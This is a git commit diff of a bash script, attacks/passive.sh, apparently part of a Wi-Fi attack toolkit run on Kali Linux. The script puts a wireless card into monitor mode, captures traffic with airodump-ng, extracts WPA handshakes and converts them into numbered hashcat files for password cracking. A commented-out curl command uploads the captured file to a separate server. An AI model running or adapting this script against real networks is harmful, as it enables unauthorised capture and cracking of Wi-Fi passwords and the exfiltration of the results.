5d511b1965ab9352ecd2ec6a0ce6dc5b6f1cdfc6
Kali Live user <rinamuka4@gmail.com>
2021-08-05 00:50:55 +0000

    fix files

--- attacks/passive.sh
+++ attacks/passive.sh
@@ -1,24 +1,54 @@
 #!/bin/bash
 
-
-main(){
-	airmon-ng check kill
-	airmon-ng start wlan1
-
-	echo "Start airodump.."
-	timeout 20 airodump-ng -w /home/kali/shakes wlan1 < /dev/null > /dev/null   
-	
+checkHandshakes(){
+	echo ""
 	echo "Clean cap file.."
-	output=`wpaclean cleanshakes.cap shakes-01.cap > /dev/null`
-	if [[ "$output" == *"net"* ]]; then
+	output=`wpaclean /home/kali/cleanshakes.cap /home/kali/shakes-01.cap` #> /dev/null`
+	echo $output
+	if [[ "$output" == *"Net"* ]]; then
 		echo "Handshakes detected!!!"
-		aircrack-ng -j cat cleanshakes.cap > /dev/null
+		if [[ -d /home/kali/shakes ]]
+		then
+
+			if [[ `ls /home/kali/shakes/ | wc -l` -ne 0 ]]; then
+				lastNum=$(($(head -n 1 /home/kali/shakes/.counter)+1))
+				aircrack-ng -j /home/kali/shakes/shake${lastNum} /home/kali/cleanshakes.cap > /dev/null
+				echo $lastNum > /home/kali/shakes/.counter
+			else
+				mkdir /home/kali/shakes/
+				aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
+				touch /home/kali/shakes/.counter
+				echo "1" > /home/kali/shakes/.counter
+			fi
+		else
+			mkdir /home/kali/shakes
+			aircrack-ng -j /home/kali/shakes/shake1 /home/kali/cleanshakes.cap > /dev/null
+			touch /home/kali/shakes/.counter
+			echo "1" > /home/kali/shakes/.counter
+		fi
+
 	else
 		echo "No handshakes"
 	fi
+	rm /home/kali/cleanshakes.cap
+	rm /home/kali/shakes-*
+}
+
+main(){
+
+	trap 'checkHandshakes' EXIT
+
+	airmon-ng check kill
+	airmon-ng start wlan0
+
+	echo "Start airodump.."
+	airodump-ng -w /home/kali/shakes wlan0mon < /dev/null > /dev/null   
+	
 	
   	#curl -i -X POST -H "imei: asdfa" -H "date: 112321312" -H "Content-Type: multipart/form-data" -F "myFile=@/home/kali/cat.hccapx" http://192.168.1.34:9000/upload
 }
+
+
 
 
 main 
